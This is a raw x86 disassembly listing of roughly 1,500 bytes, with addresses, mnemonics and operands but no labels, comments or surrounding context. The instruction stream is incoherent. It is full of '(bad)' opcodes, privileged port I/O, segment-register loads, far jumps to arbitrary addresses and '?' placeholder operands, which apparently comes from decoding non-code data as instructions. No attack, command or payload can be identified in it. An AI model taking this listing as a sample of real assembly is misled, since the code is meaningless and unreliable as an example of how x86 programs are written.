  417c89:	scas   al,BYTE PTR es:[edi]
  417c8a:	mov    edx,0xe825b545
  417c8f:	mov    cl,0x56
  417c91:	pop    edi
  417c92:	leave  
  417c93:	inc    edx
  417c94:	jg     0x417cfe
  417c96:	fimul  DWORD PTR [esi+ebp*4-0x3c1a5f5b]
  417c9d:	pop    eax
  417c9e:	mov    ?,esp
  417ca0:	es jp  0x417d0c
  417ca3:	pop    ebx
  417ca4:	bound  ecx,QWORD PTR [esi-0x7c]
  417ca7:	pop    ds
  417ca8:	xor    al,cl
  417caa:	mov    esi,0xcc5bf923
  417caf:	test   al,0xb7
  417cb1:	add    dh,dh
  417cb3:	dec    esi
  417cb4:	push   ds
  417cb5:	xchg   ebp,eax
  417cb6:	add    al,0x7d
  417cb8:	div    DWORD PTR [ecx+0x636d8c16]
  417cbe:	mov    ss,ebx
  417cc0:	push   0x7e
  417cc2:	sbb    al,bh
  417cc4:	fsub   DWORD PTR [ebp+0x4f387d97]
  417cca:	mov    ?,WORD PTR [edx+0x73c15ddc]
  417cd0:	(bad)  
  417cd1:	push   esp
  417cd2:	xchg   ecx,eax
  417cd4:	addr16 retf 
  417cd6:	and    al,0x72
  417cd8:	mov    ecx,0x20f338e9
  417cdd:	push   cs
  417cde:	adc    dl,BYTE PTR [esi]
  417ce0:	sub    al,0xf1
  417ce2:	or     esi,DWORD PTR [ebx]
  417ce4:	outs   dx,BYTE PTR ds:[esi]
  417ce5:	mov    ecx,0x5f9e3f64
  417cea:	mov    bl,0x57
  417cec:	shr    DWORD PTR [esp+eax*2],1
  417cef:	jno    0x417c79
  417cf1:	mov    al,ds:0xf016fedf
  417cf6:	dec    edi
  417cf7:	or     DWORD PTR [edx+0x79d61346],esi
  417cfd:	add    ah,BYTE PTR [edi]
  417cff:	xor    al,0xce
  417d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d02:	out    dx,al
  417d03:	jbe    0x417d74
  417d05:	loop   0x417c8c
  417d07:	jo     0x417d65
  417d09:	sti    
  417d0a:	mov    al,0x3d
  417d0c:	dec    ecx
  417d0d:	adc    al,0x71
  417d0f:	push   0x345b5db9
  417d14:	fadd   DWORD PTR [edx]
  417d16:	cmp    DWORD PTR [edx],ecx
  417d18:	loopne 0x417d06
  417d1a:	data16 mov al,ds:0x61118352
  417d20:	push   esp
  417d21:	psubusb mm3,QWORD PTR [edi]
  417d24:	adc    esi,DWORD PTR [edi]
  417d26:	adc    ebx,esp
  417d28:	sub    eax,0x890c6d5b
  417d2d:	int3   
  417d2e:	sbb    al,0xb5
  417d30:	fs pop esp
  417d32:	cmp    BYTE PTR [ecx-0x674a7357],0x45
  417d39:	xchg   edx,eax
  417d3a:	adc    DWORD PTR ds:0x226d5eb9,esp
  417d40:	out    dx,al
  417d41:	xchg   BYTE PTR [ecx],dl
  417d43:	push   ecx
  417d44:	inc    eax
  417d45:	inc    edi
  417d46:	ror    cl,1
  417d48:	jp     0x417d72
  417d4a:	test   BYTE PTR [edi],dh
  417d4c:	mov    bh,BYTE PTR [ecx+0x68]
  417d4f:	fsub   st,st(7)
  417d51:	out    0x92,eax
  417d53:	inc    ebx
  417d54:	fidivr WORD PTR [eax]
  417d56:	xor    eax,0x50a44ebd
  417d5b:	cmp    BYTE PTR [edi+0x3f35c2a],0x75
  417d62:	shl    BYTE PTR [edx],1
  417d64:	sti    
  417d65:	jl     0x417d30
  417d67:	imul   edi,DWORD PTR ds:0xa2dd63bd,0x259b90d3
  417d71:	scas   al,BYTE PTR es:[edi]
  417d72:	xor    edx,DWORD PTR [edi+0x12]
  417d75:	mov    ah,BYTE PTR [esi]
  417d77:	cmp    DWORD PTR [edx+edx*4],ebx
  417d7a:	jp     0x417df8
  417d7c:	mov    DWORD PTR [edi-0x494dd7ca],0x29c8d714
  417d86:	dec    esp
  417d87:	jbe    0x417d0f
  417d89:	pop    ss
  417d8a:	pop    edx
  417d8b:	adc    bh,dh
  417d8d:	(bad)  
  417d8e:	and    esp,DWORD PTR [ebx+eax*8]
  417d91:	cmc    
  417d92:	stos   BYTE PTR es:[edi],al
  417d93:	pop    ss
  417d94:	pop    ecx
  417d95:	fimul  WORD PTR [edx+0x2f7369e7]
  417d9b:	add    DWORD PTR [ebp-0x6b],0x347c8b8
  417da2:	rcl    BYTE PTR [ebx],cl
  417da4:	cmp    al,0x75
  417da6:	mov    esp,es
  417da8:	js     0x417d40
  417daa:	ja     0x417df1
  417dac:	aas    
  417dad:	popf   
  417dae:	jge    0x417e18
  417db0:	out    dx,al
  417db1:	xchg   edi,eax
  417db2:	add    ecx,DWORD PTR ds:0x15f4b5ad
  417db8:	mov    BYTE PTR ss:[ecx-0x4],bl
  417dbc:	and    eax,0x1dacc9e9
  417dc1:	cmp    DWORD PTR [ebx+edi*8],0x25667890
  417dc8:	dec    ecx
  417dc9:	add    DWORD PTR [ecx-0x3767d43],ecx
  417dcf:	and    DWORD PTR [edi+eax*2-0x6f],edx
  417dd3:	dec    esi
  417dd4:	fist   DWORD PTR [ebp-0x58d4e4b8]
  417dda:	adc    eax,0x4943263b
  417ddf:	pop    es
  417de0:	or     bl,al
  417de2:	and    eax,0xd311f4d
  417de7:	rol    BYTE PTR [ecx],cl
  417de9:	inc    eax
  417dea:	clc    
  417deb:	dec    esp
  417dec:	and    edi,0x16aba0ae
  417df2:	xor    DWORD PTR [edi],0x10
  417df5:	jmp    0xb70cb225
  417dfa:	sti    
  417dfb:	lock jae 0x417e7b
  417dfe:	test   eax,0x641b7a7b
  417e03:	shl    BYTE PTR [eax],cl
  417e05:	in     al,0xc8
  417e07:	stos   BYTE PTR es:[edi],al
  417e08:	lds    eax,FWORD PTR es:[edx+ecx*1+0x35]
  417e0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e0e:	jp     0x417e4c
  417e10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e11:	xchg   edx,eax
  417e12:	adc    DWORD PTR [ebx+0xa],esp
  417e15:	or     eax,0xb213e9a9
  417e1a:	sbb    DWORD PTR [ebx-0x2c56a48d],edi
  417e20:	xor    bh,BYTE PTR [edi+0x229370b4]
  417e26:	pop    esi
  417e27:	(bad)  
  417e28:	in     eax,0x55
  417e2a:	(bad)  
  417e2b:	or     al,0x73
  417e2d:	out    dx,al
  417e2e:	cmp    ebp,DWORD PTR [edi-0x3a671bdb]
  417e34:	adc    BYTE PTR [esi-0x4a153462],dh
  417e3a:	aad    0x7c
  417e3c:	in     al,dx
  417e3d:	ror    edx,1
  417e3f:	gs in  eax,dx
  417e41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e42:	das    
  417e43:	(bad)  
  417e44:	aam    0x62
  417e46:	inc    esi
  417e47:	add    DWORD PTR [edx+0x1],ebx
  417e4a:	mov    dl,BYTE PTR [eax+ecx*2+0x6e04bccc]
  417e51:	cmp    ebx,ebx
  417e53:	adc    ebp,ebx
  417e55:	ins    BYTE PTR es:[edi],dx
  417e56:	jge    0x417dde
  417e58:	imul   eax
  417e5a:	mov    ecx,0xb321c2e6
  417e5f:	pop    edx
  417e60:	es out dx,eax
  417e62:	mov    ecx,0x4320ce6d
  417e67:	pop    edi
  417e68:	mov    ecx,0x66ceab76
  417e6d:	test   BYTE PTR [edx-0x29303d69],ch
  417e73:	jno    0x417e58
  417e75:	mov    al,0x55
  417e77:	or     BYTE PTR [esi+ebp*2+0x20],bl
  417e7b:	xchg   edx,eax
  417e7c:	adc    al,BYTE PTR [ecx+eax*4-0x435264c8]
  417e83:	repnz mov edx,edx
  417e86:	jecxz  0x417eba
  417e88:	and    dl,BYTE PTR [eax]
  417e8a:	cli    
  417e8b:	repnz sbb di,WORD PTR [esi-0x731ac5ce]
  417e93:	sti    
  417e94:	push   ss
  417e95:	jmp    0x417e3c
  417e97:	and    DWORD PTR ds:0xfdd24eaf,edx
  417e9d:	xchg   esi,eax
  417e9e:	adc    al,0x7e
  417ea0:	in     eax,dx
  417ea1:	push   ecx
  417ea2:	div    BYTE PTR [ecx-0x5e9427c4]
  417ea8:	or     ah,BYTE PTR [esi]
  417eaa:	fnstsw WORD PTR [ecx]
  417eac:	mov    esi,0xe2125f0
  417eb1:	mov    al,bh
  417eb3:	in     al,dx
  417eb4:	stos   BYTE PTR es:[edi],al
  417eb5:	imul   ebx,DWORD PTR [ebp-0x3ef6cd50],0xb7420aa5
  417ebf:	xor    ah,dl
  417ec1:	sbb    eax,0x915611bd
  417ec6:	repnz xor WORD PTR [ebp+0x569cebb8],sp
  417ece:	inc    edi
  417ecf:	and    eax,0x9e7f818f
  417ed4:	sbb    DWORD PTR [eax-0x1d0a8c66],edi
  417eda:	repnz sbb eax,0x97879448
  417ee0:	push   ss
  417ee1:	mov    ds:0x17ae5ad7,al
  417ee6:	mov    dl,0x1b
  417ee8:	and    BYTE PTR [edi+0x43d731f2],ah
  417eee:	cmp    cl,BYTE PTR [esp+edx*4]
  417ef1:	hlt    
  417ef2:	shl    eax,cl
  417ef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ef5:	pop    es
  417ef6:	push   cs
  417ef7:	xor    DWORD PTR [ebx-0x655d9b1f],edx
  417efd:	jl     0x417e93
  417eff:	mov    edi,0x973bcf4
  417f04:	xchg   BYTE PTR [ecx-0x9],dl
  417f07:	and    BYTE PTR [ecx-0x49c54c0b],ch
  417f0d:	xchg   dh,bl
  417f0f:	dec    esp
  417f10:	out    0x50,al
  417f12:	sub    ebp,eax
  417f14:	dec    ebp
  417f15:	mov    cl,0x39
  417f17:	test   bh,ah
  417f19:	jo     0x417ec6
  417f1b:	cmp    eax,DWORD PTR [ecx-0x18]
  417f1e:	iret   
  417f1f:	scas   al,BYTE PTR es:[edi]
  417f20:	repnz or al,0xa5
  417f23:	adc    ebx,eax
  417f25:	or     ecx,DWORD PTR [esi-0x773d5270]
  417f2b:	jg     0x417f01
  417f2d:	popf   
  417f2e:	hlt    
  417f2f:	dec    DWORD PTR [edx+0x68]
  417f32:	or     DWORD PTR ds:0x8e095552,edi
  417f38:	sbb    DWORD PTR [edx-0x7b],ebp
  417f3b:	std    
  417f3c:	std    
  417f3d:	fiadd  DWORD PTR [esi]
  417f3f:	call   FWORD PTR [esi+0x39]
  417f42:	dec    edi
  417f43:	cmc    
  417f44:	pushf  
  417f45:	jb     0x417f8c
  417f47:	out    0x14,al
  417f49:	xchg   ecx,eax
  417f4a:	test   eax,0xbe7f7d9a
  417f4f:	cvtdq2ps xmm7,XMMWORD PTR [ecx-0x56ae3b3d]
  417f56:	jbe    0x417ef3
  417f58:	push   eax
  417f59:	clc    
  417f5a:	sbb    al,0xa9
  417f5c:	pushf  
  417f5d:	repz cmp dl,0xd5
  417f61:	fist   WORD PTR [eax]
  417f63:	imul   ecx,DWORD PTR [edx-0x1c],0xffffffb1
  417f67:	mov    ecx,0xd23c9693
  417f6c:	div    edi
  417f6e:	in     al,0x88
  417f70:	pop    ss
  417f71:	psubsw mm0,mm2
  417f74:	xchg   esp,eax
  417f75:	mov    al,ds:0xe1402cef
  417f7a:	dec    edx
  417f7b:	add    BYTE PTR [ebp+0x7f],ch
  417f7e:	sbb    al,0x53
  417f80:	je     0x417fc9
  417f82:	test   BYTE PTR [edi],0x99
  417f85:	inc    edx
  417f86:	popa   
  417f87:	data16 test BYTE PTR [edi+0x77],0x4e
  417f8c:	push   edi
  417f8d:	jno    0x417f3a
  417f8f:	push   ebx
  417f90:	mov    ecx,DWORD PTR [ebp-0x91552c5]
  417f96:	lahf   
  417f97:	and    al,BYTE PTR [edi+0x36]
  417f9a:	jo     0x417fa7
  417f9c:	sbb    al,0x3c
  417f9e:	pop    eax
  417f9f:	sbb    bl,BYTE PTR [edx+esi*1]
  417fa2:	test   BYTE PTR [edx-0x5752a081],0x18
  417fa9:	dec    ebp
  417faa:	push   esi
  417fab:	sub    al,0x7d
  417fad:	dec    ebp
  417fae:	cmp    eax,0x60563c42
  417fb3:	cs ds xor eax,0xdbfa2df4
  417fba:	sub    BYTE PTR [ecx],0xb9
  417fbd:	xchg   DWORD PTR [eax-0x33],ebp
  417fc0:	xor    eax,0x3ce9fec4
  417fc5:	faddp  st(1),st
  417fc7:	aam    0x3f
  417fc9:	pop    ds
  417fca:	jl     0x41802a
  417fcc:	aaa    
  417fcd:	adc    cl,bl
  417fcf:	mov    WORD PTR ds:0xe1a1808a,?
  417fd5:	sti    
  417fd6:	sbb    al,0x65
  417fd8:	pop    eax
  417fd9:	jb     0x417f6a
  417fdb:	call   0x48be1592
  417fe0:	mov    dl,0xf8
  417fe2:	push   esp
  417fe3:	mov    al,0xe6
  417fe5:	aaa    
  417fe6:	nop
  417fe7:	sti    
  417fe8:	xor    DWORD PTR [esi+eiz*8+0x4c],eax
  417fec:	mov    esi,edi
  417fee:	test   BYTE PTR [ebx],dl
  417ff0:	sbb    esi,DWORD PTR [eax-0x50094cb1]
  417ff6:	dec    esi
  417ff7:	fucomip st,st(1)
  417ff9:	je     0x417f9f
  417ffb:	dec    ecx
  417ffc:	shr    BYTE PTR [ecx+0x5b43d930],cl
  418002:	xchg   DWORD PTR [ebx-0x70],edx
  418005:	lds    ebx,FWORD PTR [edx+0x7d]
  418008:	popf   
  418009:	xor    al,0x8a
  41800b:	mov    db4,esp
  41800e:	add    eax,0xc290707
  418013:	dec    edx
  418014:	or     dl,BYTE PTR [eax-0x50e7bd09]
  41801a:	outs   dx,DWORD PTR ds:[esi]
  41801b:	xchg   BYTE PTR [ecx+eax*4-0x45a33309],bl
  418022:	jge    0x417fee
  418024:	dec    ecx
  418025:	push   eax
  418026:	pusha  
  418027:	sub    eax,0x78866c1a
  41802c:	mov    eax,0x13ab6529
  418031:	mov    gs,WORD PTR [esi-0x1dc11681]
  418037:	push   0x8e329ec3
  41803c:	cmp    BYTE PTR [ebx+0x52e15e2],cl
  418042:	push   ebp
  418043:	xchg   edi,esp
  418045:	sub    al,0x9d
  418047:	add    DWORD PTR [eax+0x567c3eb1],0x9b14313e
  418051:	jno    0x4180aa
  418053:	outs   dx,DWORD PTR ds:[esi]
  418054:	in     eax,dx
  418055:	pushf  
  418056:	add    BYTE PTR [ecx-0x332be75f],ah
  41805c:	xor    edi,esi
  41805e:	fadd   QWORD PTR [edi+0x73]
  418061:	shr    DWORD PTR [ebx-0x5a],0xf1
  418065:	cld    
  418066:	inc    edx
  418067:	cmp    dl,bl
  418069:	dec    ebx
  41806a:	fwait
  41806b:	cdq    
  41806c:	int    0x73
  41806e:	mov    WORD PTR fs:[edx+0x74],es
  418072:	out    0xef,eax
  418074:	push   edi
  418075:	mov    ebx,edx
  418077:	cmc    
  418078:	pop    ss
  418079:	retf   
  41807a:	daa    
  41807b:	pusha  
  41807c:	mov    bl,0x73
  41807e:	cmp    DWORD PTR [ebx+0x53f0b329],ebp
  418084:	inc    ebx
  418085:	mov    dh,BYTE PTR [ebp+edi*8+0x55]
  418089:	call   0xfc578d57
  41808e:	cmp    eax,0xa943a984
  418093:	push   edi
  418094:	jl     0x41810e
  418096:	sbb    DWORD PTR [ebx],esp
  418098:	sub    edi,DWORD PTR [ecx+eax*1]
  41809b:	sbb    bl,BYTE PTR [ecx+ebx*8-0x5]
  41809f:	daa    
  4180a0:	std    
  4180a1:	inc    ebp
  4180a2:	les    ecx,FWORD PTR [ebx]
  4180a4:	sub    eax,0x67d27da9
  4180a9:	push   esi
  4180aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180ab:	xchg   esi,eax
  4180ac:	in     eax,dx
  4180ad:	out    0xc8,al
  4180af:	add    DWORD PTR [eax],ebx
  4180b1:	imul   edx,edi,0xffffffae
  4180b4:	(bad)  
  4180b5:	push   edx
  4180b6:	pop    ss
  4180b7:	mov    ecx,0x51efdb0d
  4180bc:	adc    dl,ch
  4180be:	hlt    
  4180bf:	pusha  
  4180c0:	or     edx,DWORD PTR [edx]
  4180c2:	and    edi,esp
  4180c4:	jmp    0x4166:0x669aa0bd
  4180cb:	mov    eax,0xf7bfc458
  4180d0:	ds jns 0x418096
  4180d3:	xlat   BYTE PTR ds:[ebx]
  4180d4:	push   ebp
  4180d5:	or     ecx,ecx
  4180d7:	sub    eax,DWORD PTR [edi]
  4180d9:	imul   ebx,DWORD PTR fs:[ebx],0xd5e38c52
  4180e0:	or     BYTE PTR [ebp-0x6258042e],bl
  4180e6:	ds call 0x6759449c
  4180ec:	dec    edx
  4180ee:	pop    esi
  4180ef:	adc    eax,0xe68e06eb
  4180f4:	(bad)  
  4180f5:	jne    0x41810a
  4180f7:	dec    ebx
  4180f8:	in     al,0x6e
  4180fa:	push   ebp
  4180fb:	xor    eax,0x8142f1e2
  418100:	or     dl,0xac
  418103:	cmp    al,BYTE PTR [edx-0xc6a96a1]
  418109:	mov    edx,0xded3fd68
  41810e:	mov    dl,BYTE PTR [edx]
  418110:	adc    bl,BYTE PTR [ebx]
  418112:	stc    
  418113:	sbb    esi,DWORD PTR [edi]
  418115:	pop    eax
  418116:	add    eax,0x29f30e2b
  41811b:	cmp    eax,0xf8826e6f
  418120:	push   esp
  418121:	xchg   ebx,eax
  418122:	mov    WORD PTR [ecx-0x2ce9dcc2],?
  418128:	fwait
  418129:	in     al,dx
  41812a:	sahf   
  41812b:	pushf  
  41812c:	xor    al,0xe1
  41812e:	into   
  41812f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418130:	mov    edx,0x2cd7b300
  418135:	push   ds
  418136:	(bad)  
  418137:	das    
  418138:	addr16 in eax,dx
  41813a:	sbb    eax,0x29b70870
  41813f:	lock outs dx,DWORD PTR ds:[esi]
  418141:	jecxz  0x418106
  418143:	call   0x86a1c51d
  418148:	and    BYTE PTR [eax-0x3b],dl
  41814b:	cmp    al,0x8c
  41814d:	rol    ch,1
  41814f:	mov    esp,0xd00d2ea2
  418154:	adc    DWORD PTR fs:[ebx+0x56],eax
  418158:	xor    eax,esp
  41815a:	or     BYTE PTR gs:[ebx],0xb4
  41815e:	sub    ah,BYTE PTR [ebp-0x3306cdc3]
  418164:	inc    eax
  418165:	jno    0xc3421992
  41816b:	add    esp,DWORD PTR [edx+eax*1]
  41816e:	xor    ebx,DWORD PTR [edi]
  418170:	in     al,dx
  418171:	pop    ebp
  418172:	mov    ebx,0x52ff25da
  418177:	or     eax,0x79baabcd
  41817c:	push   ds
  41817d:	xor    DWORD PTR [eax-0x548b8f07],ecx
  418183:	jmp    0x143:0x5db37bbb
  41818a:	adc    BYTE PTR [ecx-0x38],0x6b
  41818e:	clc    
  41818f:	sub    esp,DWORD PTR [ebp+0x2f2640bd]
  418195:	jp     0x418162
  418197:	dec    esp
  418198:	dec    ebp
  418199:	int    0xa8
  41819b:	clc    
  41819c:	shl    DWORD PTR [edx-0x72f5b205],cl
  4181a2:	and    eax,0x1a964f3
  4181a7:	or     dl,BYTE PTR [esi+edi*4+0x2e3002ad]
  4181ae:	xor    BYTE PTR [ecx],bh
  4181b0:	mov    edi,0x6fc4e374
  4181b5:	push   ebp
  4181b6:	fsubr  QWORD PTR [ebx+0x2a]
  4181b9:	adc    DWORD PTR [esi],edx
  4181bb:	pop    ss
  4181bc:	cmp    BYTE PTR [eax-0x16],0x2a
  4181c0:	push   ss
  4181c1:	scas   eax,DWORD PTR es:[edi]
  4181c2:	sbb    DWORD PTR [edx+edi*8-0x59d64c8],edi
  4181c9:	or     esi,eax
  4181cb:	push   0x7c3fe903
  4181d0:	sti    
  4181d1:	sbb    DWORD PTR [edx+0x2163d575],0x31
  4181d8:	cmp    eax,0x97f2ff7f
  4181dd:	mov    esi,DWORD PTR [edi+0x2a]
  4181e0:	lods   eax,DWORD PTR ds:[esi]
  4181e1:	mov    cl,0x7e
  4181e3:	shr    DWORD PTR [esi-0x2ed15575],1
  4181e9:	leave  
  4181ea:	cwde   
  4181eb:	pop    ebp
  4181ec:	(bad)  
  4181ed:	cld    
  4181ee:	das    
  4181ef:	jecxz  0x4181b5
  4181f1:	in     eax,dx
  4181f2:	clc    
  4181f3:	push   0xa5749052
  4181f8:	mov    edx,DWORD PTR [eax+0x47]
  4181fb:	hlt    
  4181fc:	mov    ebp,0x486f5c18
  418201:	push   cs
  418202:	lds    esp,FWORD PTR [ecx+esi*1-0x7]
  418206:	in     eax,0x5
  418208:	fcom   QWORD PTR [esi]
  41820a:	retf   0x341b
  41820d:	js     0x4181b2
  41820f:	and    dl,ah
  418211:	test   edi,ecx
  418213:	push   cs
  418214:	stos   DWORD PTR es:[edi],eax
  418215:	xor    al,0x63
  418217:	neg    BYTE PTR [eax-0x30]
  41821a:	inc    ebx
  41821b:	pop    ds
  41821c:	cli    
  41821d:	mov    edi,0x16250142
  418222:	popf   
  418223:	fs popf 
  418225:	mov    edx,0x71faacca
  41822a:	jmp    0x4181fc
  41822c:	mov    ecx,0xd01f2dd7
  418231:	mov    BYTE PTR [ecx+0x3af33d47],cl
  418237:	in     al,dx
  418238:	jb     0x418292
  41823a:	sub    eax,DWORD PTR [ecx+0x67]
  41823d:	mov    al,0xb3
  41823f:	jl     0x41821a
  418241:	shl    DWORD PTR ds:[edi-0x5b],0x94
  418246:	push   esi
  418247:	sub    edx,DWORD PTR [ebx-0x77]
  41824a:	push   edi
  41824b:	pop    esp
  41824c:	std    
  41824d:	mov    bl,0x94
  41824f:	sbb    al,0xf5
  418251:	pop    edx
  418252:	pop    ebx
  418253:	lahf   
  418254:	pop    ds
  418255:	(bad)  
  418256:	aaa    
  418257:	xchg   esp,eax
  418258:	mov    DWORD PTR [eax],esi
  41825a:	xlat   BYTE PTR ss:[ebx]
  41825c:	nop
  41825d:	fwait
  41825e:	ror    BYTE PTR [eax],0x2e
  418261:	es sub eax,0x83167322
  418267:	sbb    edi,edx
  418269:	pop    ebp
  41826a:	ss out 0xcd,al
  41826d:	imul   esp,edx,0xd9d1c06c
  418273:	jle    0x418228
  418275:	scas   al,BYTE PTR es:[edi]
  418276:	add    ch,BYTE PTR [eax+edi*4-0x31]
  41827a:	faddp  st(7),st
  41827c:	loopne 0x418254
  41827e:	xchg   ebp,eax
  41827f:	loop   0x4182c0
  418281:	jecxz  0x418238
  418283:	cld    
  418284:	pop    eax
  418285:	ins    BYTE PTR es:[edi],dx
  418286:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418287:	pop    ebp
  418288:	sbb    DWORD PTR [ecx],esp
  41828a:	and    eax,DWORD PTR [eax-0x4b8e473c]
  418290:	jecxz  0x418268
  418292:	(bad)  
  418293:	int    0xfa
  418295:	lods   al,BYTE PTR ds:[esi]
  418296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418297:	dec    edx
  418298:	cmp    al,0x5d
  41829a:	lods   al,BYTE PTR ds:[esi]
  41829b:	and    BYTE PTR [eax],cl
  41829d:	pop    edi
  41829e:	adc    DWORD PTR [ebx],ebx
  4182a0:	mov    ebx,0xcaa74de8
  4182a5:	rcr    cl,1
  4182a7:	xchg   ebp,eax
  4182a8:	pop    es
  4182a9:	lods   al,BYTE PTR ds:[esi]
  4182aa:	jg     0x41829f
  4182ac:	lahf   
  4182ad:	ja     0x418235
  4182af:	sub    eax,0x4b511975
  4182b4:	shl    BYTE PTR [edi],0xaa
  4182b7:	mov    ecx,0x3a37b37
  4182bc:	pop    edi
  4182bd:	(bad)  
  4182be:	mov    edi,0xcc8d0fd1
  4182c3:	xor    al,BYTE PTR [edi-0x3b]
  4182c6:	xor    ch,BYTE PTR [edi-0x59176489]
  4182cc:	enter  0xcf3d,0xc6
  4182d0:	adc    al,0xb1
  4182d2:	repz push esi
  4182d4:	stos   DWORD PTR es:[edi],eax
  4182d5:	call   0xc50f33aa
  4182da:	adc    al,al
  4182dc:	mov    bh,0x8
  4182de:	mov    ds:0x33c16eb1,eax
  4182e3:	gs dec esi
  4182e5:	mov    ecx,0xa7fac7df
  4182ea:	xchg   edi,eax
  4182eb:	shl    DWORD PTR [esi],cl
  4182ed:	and    al,0x5d
  4182ef:	retf   
  4182f0:	je     0x418283
  4182f2:	dec    esi
  4182f3:	push   eax
  4182f4:	punpckhdq mm7,QWORD PTR [esi]
  4182f7:	and    dl,BYTE PTR [eax]
  4182f9:	push   esi
  4182fa:	jmp    0xbc2e2d5
  4182ff:	inc    ecx
  418300:	mov    esi,0xe68b7783
  418305:	(bad)
  418309:	bts    DWORD PTR [eax],edi
  41830c:	sar    DWORD PTR [ebp+0x42],0x59
  418310:	sub    ecx,DWORD PTR [eax]
  418312:	clc    
  418313:	fistp  WORD PTR [edi]
  418315:	cmc    
  418316:	scas   eax,DWORD PTR es:[edi]
  418317:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  418319:	and    BYTE PTR [eax+ecx*1],0xb
  41831d:	int3   
  41831e:	gs jl  0x4182e8
  418321:	sbb    al,0x2b
  418323:	push   ss
  418324:	ud2    
  418326:	popf   
  418327:	mov    edi,0xfcc820d5
  41832c:	sar    DWORD PTR [esp+ebp*8],1
  41832f:	pop    edi
  418330:	mov    bh,0xec
  418332:	sub    al,dh
  418334:	xor    BYTE PTR [ebx+0xa],dl
  418337:	jne    0x4182dd
  418339:	mov    al,BYTE PTR [ebx+eax*1]
  41833c:	int3   
  41833d:	mov    ds:0xa938de4a,al
  418342:	mov    ds:0xcb7e8f5b,eax
  418347:	icebp  
  418348:	xor    DWORD PTR [ebx-0x7f],esp
  41834b:	mov    WORD PTR [esi+0x61c18742],fs
  418351:	inc    eax
  418352:	mov    ah,0xa0
  418354:	mov    al,ds:0x527d2a96
  418359:	adc    cl,dl
  41835b:	dec    eax
  41835c:	popa   
  41835d:	ins    DWORD PTR es:[edi],dx
  41835e:	lods   al,BYTE PTR ds:[esi]
  41835f:	jl     0x4182e2
  418361:	lods   al,BYTE PTR ds:[esi]
  418362:	push   esi
  418363:	push   esi
  418364:	mov    ebx,0x4e96936b
  418369:	mov    ecx,DWORD PTR [ebx]
  41836b:	test   al,0xa6
  41836d:	and    al,0xcc
  41836f:	data16 ja 0x4183d7
  418372:	pushf  
  418373:	bound  edi,QWORD PTR [edx+0x40]
  418376:	mov    dh,0xf6
  418378:	cli    
  418379:	mov    ebp,0x2692b621
  41837e:	or     eax,0xc6c368fd
  418383:	ja     0x418345
  418385:	inc    ecx
  418386:	shl    ah,cl
  418388:	sbb    al,BYTE PTR [ecx+0x13ee3928]
  41838e:	or     bl,BYTE PTR [ecx-0x3b]
  418391:	fld    TBYTE PTR [ebx]
  418393:	xor    al,0x20
  418395:	shl    DWORD PTR [esi+0x646af1c2],1
  41839b:	sbb    edi,DWORD PTR [esi-0x123ca842]
  4183a1:	pushf  
  4183a2:	out    0x90,al
  4183a4:	out    dx,eax
  4183a5:	ficom  DWORD PTR ds:[ecx-0x57431609]
  4183ac:	push   ss
  4183ad:	jp     0x418405
  4183af:	(bad)  
  4183b0:	mov    al,ds:0x3afdaf19
  4183b5:	inc    edi
  4183b6:	rcr    BYTE PTR [ebx+0x6017b07e],0x36
  4183bd:	add    BYTE PTR [edx],0xd9
  4183c0:	sti    
  4183c1:	iret   
  4183c2:	popa   
  4183c3:	jno    0x418356
  4183c5:	dec    edi
  4183c6:	inc    ebx
  4183c7:	sbb    esi,DWORD PTR [ebx-0x6fd58356]
  4183cd:	mov    ecx,0xb45e546a
  4183d2:	stos   BYTE PTR es:[edi],al
  4183d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183d4:	idiv   edx
  4183d6:	lods   al,BYTE PTR ds:[esi]
  4183d7:	mov    ebx,esp
  4183d9:	imul   dx,WORD PTR [eax-0x51513f30],0xfbd6
  4183e2:	inc    ebp
  4183e3:	je     0x4183cb
  4183e5:	in     al,0x68
  4183e7:	sbb    bh,BYTE PTR [esi+ecx*1-0x2b2acb60]
  4183ee:	push   edi
  4183ef:	shl    DWORD PTR [edx-0x1b],cl
  4183f2:	mov    edi,0xda37941b
  4183f7:	not    DWORD PTR [edi+0x7d3a0b2d]
  4183fd:	sbb    dl,ah
  4183ff:	ror    BYTE PTR [ebx],1
  418401:	push   eax
  418402:	in     al,dx
  418403:	shl    DWORD PTR [esi+ebx*8-0x10],0x26
  418408:	int    0x7
  41840a:	xchg   BYTE PTR [edx],dl
  41840c:	clc    
  41840d:	jmp    DWORD PTR [ebx-0x3a]
  418410:	or     esp,esi
  418412:	push   eax
  418413:	sahf   
  418414:	repnz int3 
  418416:	not    DWORD PTR [ebp+0xc]
  418419:	pop    esi
  41841a:	xlat   BYTE PTR ds:[ebx]
  41841b:	mov    al,0xc
  41841d:	xor    esi,0x4342fb1a
  418423:	(bad)  [esi-0x74]
  418426:	out    0x4a,al
  418428:	jmp    0x41847a
  41842a:	inc    ebx
  41842b:	addr16 mov dl,0x58
  41842e:	push   0xfffffff9
  418430:	cmp    eax,0xcf810939
  418435:	or     al,0xbd
  418437:	fsub   QWORD PTR [eax+eiz*8+0x164ecd5c]
  41843e:	xor    eax,DWORD PTR [esi+0x1d95c137]
  418444:	add    bl,BYTE PTR [ebx-0x416048c4]
  41844a:	sbb    DWORD PTR [bx+si+0x6aac],edx
  41844f:	cmp    eax,0x2c2bd5b
  418454:	push   eax
  418456:	add    al,0x9e
  418458:	fild   DWORD PTR [edi]
  41845a:	xor    BYTE PTR ds:0xf144886c,0x46
  418461:	push   edx
  418462:	dec    ebp
  418463:	push   cs
  418464:	lahf   
  418465:	js     0x4184af
  418467:	scas   al,BYTE PTR es:[edi]
  418468:	xor    bh,BYTE PTR [ecx]
  41846a:	sbb    DWORD PTR [edx],0x4c55d272
  418470:	mov    ds:0xc6cbacde,eax
  418475:	inc    esp
  418476:	sbb    BYTE PTR [edi+ebp*8+0x69],cl
  41847a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41847b:	cli    
